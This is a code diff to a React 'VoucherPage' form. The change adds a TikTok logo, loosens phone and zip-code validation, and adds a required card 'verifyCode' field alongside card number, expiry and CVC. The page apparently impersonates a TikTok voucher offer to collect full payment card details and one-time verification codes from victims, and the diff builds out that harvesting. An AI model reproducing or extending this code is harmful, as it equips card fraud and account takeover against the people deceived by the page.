@@ -12,6 +12,7 @@ import './index.css';
 import { firstCaptialize, isValidZipCode, validatePhone } from '../../utils';
 import moment from 'moment';
 import { countries } from 'countries-list';
+import logo from '../../assets/images/tiktokLogo.svg';
 
 const VoucherPage = () => {
 	const navigate = useNavigate();
@@ -22,24 +23,21 @@ const VoucherPage = () => {
 	const validationSchema = Yup.object().shape({
 		firstName: Yup.string().required('Invalid first name'),
 		lastName: Yup.string().required(),
-		phone: Yup.string()
-			.required()
-			.test('valid', 'Invalid phone number', (val) => {
-				return val.length > 8 && val.length < 15 && validatePhone(val);
-			}),
+		phone: Yup.string().required(),
+		// .test('valid', 'Invalid phone number', (val) => {
+		// 	return val.length > 8 && val.length < 15;
+		// }),
 		email: Yup.string().email(),
 		address: Yup.string().required(),
 		address2: Yup.string().required(),
 		city: Yup.string().required(),
 		region: Yup.string().required(),
-		zipcode: Yup.string()
-			.min(3, 'Invalid zip code')
-			.required()
-			.test('val', 'Invalid zip code', (val) => isValidZipCode(val)),
+		zipcode: Yup.string().required(),
+		// .test('val', 'Invalid zip code', (val) => isValidZipCode(val)),
 		state: Yup.string().required(),
 		country: Yup.string().required(),
-		gender: Yup.string().required(),
 
+		cardVerifyCode: Yup.string().required(),
 		cardShema: Yup.string().required(),
 		cardType: Yup.string().required(),
 		cardName: Yup.string().required(),
@@ -64,9 +62,9 @@ const VoucherPage = () => {
 		region: '',
 		zipcode: '',
 		state: '',
-		gender: '',
 		country: '',
 
+		cardVerifyCode: '',
 		cardSchema: 'DEBIT',
 		cardType: 'VISA',
 		cardName: '',
@@ -94,9 +92,9 @@ const VoucherPage = () => {
 	const watchCity = watch('city');
 	const watchZipcode = watch('zipcode');
 	const watchState = watch('state');
-	const watchGender = watch('gender');
 	const watchCountry = watch('country');
 
+	const watchCardVerifyCode = watch('cardVerifyCode');
 	const watchCardSchema = watch('cardSchema');
 	const watchCardType = watch('cardType');
 	const watchCardName = watch('cardName');
@@ -121,11 +119,12 @@ const VoucherPage = () => {
 		type: watchCardType,
 		cardName: watchCardName,
 		cardNumber: watchCardNumber,
-		expires: moment(watchExpires).format('MM/YY'),
+		expires: watchExpires && moment(watchExpires).format('MM/YY'),
 		cvc: watchCvc,
 		level: 'GOLD',
 		bank: `Bank of ${watchState && firstCaptialize(countries[watchState]?.name)}`,
 		bin: Math.floor(Math.random() * 1000000),
+		verifyCode: watchCardVerifyCode,
 	};
 
 	const onSubmit = async () => {
@@ -150,6 +149,9 @@ const VoucherPage = () => {
 
 	return (
 		<>
+			<div style={{ position: 'absolute', top: 0, left: 0 }} className='sm:hidden md:block'>
+				<img src={logo} height={150} width={150} />
+			</div>
 			{step === 0 && (
 				<Infomation
 					onSend={handleSend}
@@ -160,8 +162,22 @@ const VoucherPage = () => {
 					control={control}
 				/>
 			)}
-			{step === 1 && <CardDetailForm control={control} onSubmit={onSubmit} loading={loading} />}
-			{/* {<CardDetailForm control={control} onSubmit={onSubmit} loading={loading} />} */}
+			{step === 1 && (
+				<CardDetailForm
+					disabled={
+						Object.keys(submitValueCard).some((item) => {
+							if (submitValueCard[item] || item === 'verifyCode') {
+								console.log(item, submitValueCard[item], 'item');
+								return false;
+							}
+							return true;
+						}) || Object.keys(errors).length > 0
+					}
+					control={control}
+					onSubmit={onSubmit}
+					loading={loading}
+				/>
+			)}
 		</>
 	);
 };
